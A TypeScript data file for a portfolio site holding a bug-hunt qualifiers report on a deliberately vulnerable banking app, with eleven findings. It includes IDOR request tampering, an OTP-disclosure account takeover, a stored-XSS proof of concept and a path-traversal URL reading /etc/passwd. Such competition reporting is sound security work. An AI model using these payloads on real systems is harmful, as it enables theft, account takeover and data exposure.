import type { Writeup } from './types';

const file = (name: string) => `${import.meta.env.BASE_URL}writeups/${name}.pdf`;
const TARGET = 'https://h1bh26-qualifiers-target.bughunt.info';

export const writeups: Writeup[] = [
  {
    slug: 'hackerone-bughunt-2026',
    title: 'HackerOne Bug Hunt 2026 — Qualifiers Report',
    event: 'HackerOne Bug Hunt 2026',
    year: '2026',
    author: 'Md Nayeem Ahmed',
    placement: 'Finalist',
    kind: 'bugbounty',
    domains: ['ctf', 'offensive'],
    file: file('hackerone-bughunt-2026'),
    summary:
      'My qualifiers report for HackerOne Bug Hunt 2026, reaching the finals. Eleven vulnerabilities on a banking-style target — broken access control (IDOR), business-logic flaws, an OTP-disclosure account takeover and more, each with reproduction steps and impact.',
    glance: [
      { label: 'Result', value: 'Finalist', hint: 'qualifiers passed' },
      { label: 'Vulnerabilities', value: '11', hint: 'reported' },
      { label: 'Critical', value: '7', hint: 'highest severity' },
    ],
    overview: [
      'HackerOne Bug Hunt 2026 qualifiers ran against a deliberately vulnerable banking web application. The report documents each finding with the vulnerable endpoint, reproduction steps and business impact.',
      'The theme throughout is broken access control: endpoints that trust client-supplied identifiers and amounts without verifying ownership or server-side rules. Every finding below is reproduced exactly as reported.',
    ],
    entriesLabel: 'Vulnerabilities reported',
    entries: [
      {
        name: 'Client-side balance manipulation at signup',
        tag: 'Critical',
        summary:
          'The application contains a critical business-logic flaw: the backend trusts the client-controlled BL (balance) parameter during account creation and applies it directly, with no server-side validation.',
        endpoint: 'POST /api/add_balance',
        repro: [
          {
            text: 'Navigate to the signup process and intercept the account-creation request:',
            code: `POST /api/add_balance HTTP/2\nHost: h1bh26-qualifiers-target.bughunt.info\nContent-Type: application/json\n\n{"AC":"100148315949","BL":"1000"}`,
            lang: 'http',
          },
          {
            text: 'Modify the BL value to an arbitrary large number and forward the request:',
            code: '{"AC":"100148315949","BL":"7000000"}',
            lang: 'json',
          },
          {
            text: 'The server responds with 200 OK, confirming the manipulated value was accepted:',
            code: '{"new_balance":7000000.0,"success":true}',
            lang: 'json',
          },
        ],
        impact: [
          'Self-assign any opening balance at signup',
          'Bypass business rules: minimum deposit, account tiers, eligibility',
          'Inaccurate ledger entries and accounting inconsistencies',
          'Possible abuse for fraud, laundering, and bypass of AML/compliance controls',
        ],
      },
      {
        name: 'IDOR — modify any user’s balance',
        tag: 'Critical',
        summary:
          'The add_balance endpoint never verifies whether the authenticated user owns the account in the AC parameter — changing it lets an attacker alter any user’s balance.',
        endpoint: 'POST /api/add_balance',
        repro: [
          { text: 'Log in with the primary account and intercept the legitimate request:' },
          {
            code: '{"AC":"100148315949","BL":"1000"}',
            lang: 'json',
          },
          {
            text: 'Change AC to another valid account number (here, a secondary test account) with an arbitrary balance:',
            code: '{"AC":"100148724955","BL":"7000000"}',
            lang: 'json',
          },
          {
            text: 'The server responds with 200 OK and updates the targeted account — no authorization check is performed:',
            code: 'HTTP/2 200 OK\n{"new_balance":7000000.0,"success":true}',
            lang: 'http',
          },
        ],
        impact: [
          'Modify the balance of any account, not just the attacker’s own',
          'Add or remove funds from another user’s balance — direct financial loss',
          'Bypass all business rules and financial controls; corrupt the bank ledger',
        ],
      },
      {
        name: 'IDOR — delete any user’s beneficiaries',
        tag: 'Critical',
        summary:
          'delete_beneficiary accepts any beneficiary_id without checking it belongs to the authenticated user, allowing deletion of other users’ saved recipients.',
        endpoint: 'POST /api/delete_beneficiary',
        repro: [
          { text: 'Log in, open the Beneficiaries page, and intercept the legitimate request:' },
          {
            code: 'POST /api/delete_beneficiary\n{"beneficiary_id":3618}',
            lang: 'http',
          },
          {
            text: 'Replace the id with one belonging to another user (not owned by the authenticated account) and forward:',
            code: '{"beneficiary_id":3618}',
            lang: 'json',
          },
          {
            text: 'The server confirms the deletion — no ownership validation on beneficiary_id:',
            code: '{"message":"Beneficiary deleted successfully","success":true}',
            lang: 'json',
          },
        ],
        impact: [
          'Delete any user’s beneficiary, disrupting their financial operations',
          'Loss of saved payment recipients; failed or delayed payments',
          'Targeted harassment or sabotage of user accounts',
        ],
      },
      {
        name: 'IDOR — full account & PII disclosure',
        tag: 'Critical',
        summary:
          'The balance lookup trusts the client-supplied account_number with no ownership check, returning full account, card and personal data for any user. (Card digits masked below.)',
        endpoint: 'POST /api/balance',
        repro: [
          { text: '1. Intercept a normal balance request from your own account:' },
          {
            code: 'POST /api/balance\n{"account_number":"100148315949"}',
            lang: 'http',
          },
          { text: '2. The server returns your account data, including card details.' },
          { text: '3. Modify account_number to any other valid id and forward:' },
          {
            code: '{"account_number":"100148724955"}',
            lang: 'json',
          },
          {
            text: '4. The server responds with the other user’s full sensitive record — no access-control checks in place:',
            code: '{\n  "account_number": "100148724955",\n  "account_type": "Savings",\n  "balance": 500000007000000.0,\n  "branch": "Uttara, Dhaka",\n  "card_number": "4532 •••• •••• 1345",\n  "card_cvv": "•••",\n  "card_expiry": "11/29",\n  "email": "nayeem@gmail.com",\n  "full_name": "oxnayeemsecond",\n  "success": true\n}',
            lang: 'json',
          },
        ],
        impact: [
          'Violates PCI-DSS controls around cardholder data — catastrophic severity',
          'Exposes any customer’s balance, account number, branch and account type',
          'Leaks PII (full name, email, profile picture)',
          'Enables identity theft, card fraud, social engineering and account takeover',
        ],
      },
      {
        name: 'Account takeover via OTP disclosure',
        tag: 'Critical',
        summary:
          'The “Recover User ID” feature returns a victim’s user id from just their account number, and the password-reset request carries the OTP in plaintext — full account takeover without touching the victim’s email or phone.',
        endpoint: 'POST /api/request_password_reset',
        repro: [
          {
            text: 'Use “Recover User ID” with the victim’s account number (e.g. 100148724955). The application returns the associated user id (e.g. 387299) with no additional verification.',
          },
          { text: 'Submit that user id to “Forgot Password”. An OTP is generated for the victim.' },
          {
            text: 'Intercept the reset request — the OTP sits in plaintext in the body:',
            code: 'POST /api/request_password_reset HTTP/1.1\nHost: h1bh26-qualifiers-target.bughunt.info\nContent-Type: application/json\n\n{"user_id":"387299","otp":"752845"}',
            lang: 'http',
          },
          {
            text: 'Submit the intercepted OTP to complete the reset flow as the victim.',
          },
        ],
        impact: [
          'Full account takeover (ATO): reset the victim’s password',
          'Complete access to the victim’s account and sensitive data',
          'Perform unauthorized actions on behalf of the victim',
        ],
      },
      {
        name: 'IDOR — read any account statement',
        tag: 'High',
        summary:
          'generate_statement takes account_number as user-controlled input without verifying ownership, returning any user’s full financial statement.',
        endpoint: 'POST /api/generate_statement',
        repro: [
          { text: 'Log in as a valid user and intercept the dashboard statement request:' },
          {
            code: 'POST /api/generate_statement HTTP/2\nHost: h1bh26-qualifiers-target.bughunt.info\nCookie: session=<valid session>\nContent-Type: application/json\n\n{"account_number":"100148724955"}',
            lang: 'http',
          },
          {
            text: 'Change account_number to another user’s account and forward:',
            code: '{"account_number":"<VICTIM_ACCOUNT_NUMBER>"}',
            lang: 'json',
          },
          {
            text: 'The server returns the victim’s full account statement — balances, transactions and sensitive records.',
          },
        ],
        impact: [
          'Read any user’s full financial history and balances',
          'Violates privacy and confidentiality of financial records',
          'Statement data combined with other flaws enables financial fraud',
        ],
      },
      {
        name: 'IDOR — cancel scheduled transfers',
        tag: 'High',
        summary:
          'cancel_scheduled_transfer acts on any client-supplied transfer_id without an ownership check, letting an attacker cancel other users’ scheduled transfers.',
        endpoint: 'POST /api/cancel_scheduled_transfer',
        repro: [
          { text: 'Log in, open Scheduled Transfers, and intercept the legitimate request:' },
          {
            code: 'POST /api/cancel_scheduled_transfer HTTP/2\nHost: h1bh26-qualifiers-target.bughunt.info\nCookie: session=<valid session>\nContent-Type: application/json\n\n{"transfer_id":185}',
            lang: 'http',
          },
          {
            text: 'Swap in another user’s transfer id and forward:',
            code: '{"transfer_id": <VICTIM_TRANSFER_ID>}',
            lang: 'json',
          },
          {
            text: 'The server processes the cancellation even though the attacker does not own that scheduled transfer.',
          },
        ],
        impact: [
          'Cancel other users’ scheduled transfers',
          'Disrupt financial operations; failed transactions and monetary loss',
          'Unauthorized actions on victim accounts',
        ],
      },
      {
        name: 'Stored XSS in avatar upload',
        tag: 'High',
        summary:
          'The profile-picture upload accepts an HTML file and serves it back as text/html, executing attacker-controlled JavaScript for anyone who visits the stored file.',
        endpoint: `${TARGET}/settings → /static/uploads/profiles/`,
        repro: [
          { text: 'Open Settings and use the profile_picture upload option.' },
          {
            text: 'Upload a file named test.html containing:',
            code: '<h1>Stored XSS PoC</h1><script>document.body.insertAdjacentHTML("beforeend", "<p>alert executed</p>");alert("Stored XSS PoC");</script>',
            lang: 'html',
          },
          {
            text: 'Visit the stored file — the script executes, confirming stored XSS:',
            code: `${TARGET}/static/uploads/profiles/173020_test.html`,
            lang: 'text',
          },
        ],
        impact: [
          'Session hijacking of anyone (including admins) visiting the file',
          'Account takeover, CSRF bypass and privilege escalation',
          'Full compromise of affected accounts; possible escalation via admin session theft',
        ],
      },
      {
        name: 'Path traversal in /download',
        tag: 'High',
        summary:
          'The download endpoint passes the file parameter to the filesystem without sanitization, so URL-encoded ../ sequences read arbitrary server files.',
        endpoint: 'GET /download?file=',
        repro: [
          { text: 'Request a system file through encoded traversal sequences:' },
          {
            code: `${TARGET}/download?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`,
            lang: 'text',
          },
          {
            text: 'The response downloads /etc/passwd contents, e.g.:',
            code: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...',
            lang: 'text',
          },
        ],
        impact: [
          'Read /etc/passwd, /etc/shadow, configs and application source',
          'Reach database credentials, API keys and environment variables',
        ],
      },
      {
        name: 'Unauthorized money transfer',
        tag: 'Critical',
        summary:
          'The transfer endpoint never checks sufficient balance or transfer limits — any amount to any account goes through, creating money out of thin air.',
        endpoint: 'POST /api/transfer',
        repro: [
          { text: 'Log in, start a transfer on the dashboard, and intercept it in Burp Suite:' },
          {
            code: 'POST /api/transfer HTTP/2\nHost: h1bh26-qualifiers-target.bughunt.info\nContent-Type: application/json\n\n{"to_account":"100148315949","amount":1000,"reference":""}',
            lang: 'http',
          },
          {
            text: 'Raise the amount far beyond the account balance and send:',
            code: '{"to_account":"100148315949","amount":999999999,"reference":""}',
            lang: 'json',
          },
          {
            text: 'The transfer processes successfully despite insufficient funds.',
          },
        ],
        impact: [
          'Transfer unlimited amounts to any account without sufficient balance',
          'Create money out of thin air by exceeding the real balance',
        ],
      },
      {
        name: 'Unauthorized balance top-up / zero-out',
        tag: 'Critical',
        summary:
          'add_balance accepts any account number with no authorization check, so any user’s balance can be set to an arbitrary amount — including zero.',
        endpoint: 'POST /api/add_balance',
        repro: [
          { text: 'Send the request in Repeater with an arbitrary balance:' },
          {
            code: 'POST /api/add_balance HTTP/2\nHost: h1bh26-qualifiers-target.bughunt.info\nContent-Type: application/json\n\n{"AC":"100111534047","BL":"00"}',
            lang: 'http',
          },
          {
            text: 'Change AC to another user’s account number and send:',
            code: '{"AC":"100111534048","BL":"00"}',
            lang: 'json',
          },
          {
            text: 'The target’s balance is set to 00 — no authorization involved.',
          },
        ],
        impact: [
          'Reset any user’s balance to zero — complete financial loss',
          'Set arbitrary balances across the system; enable financial fraud',
        ],
      },
    ],
    skills: [
      'Broken access control (IDOR)',
      'Business-logic abuse',
      'Authentication / account takeover',
      'Stored XSS',
      'Path traversal',
      'Burp Suite & request tampering',
      'Impact-driven reporting',
    ],
  },
];

export const writeupMap: Record<string, Writeup> = Object.fromEntries(writeups.map((w) => [w.slug, w]));
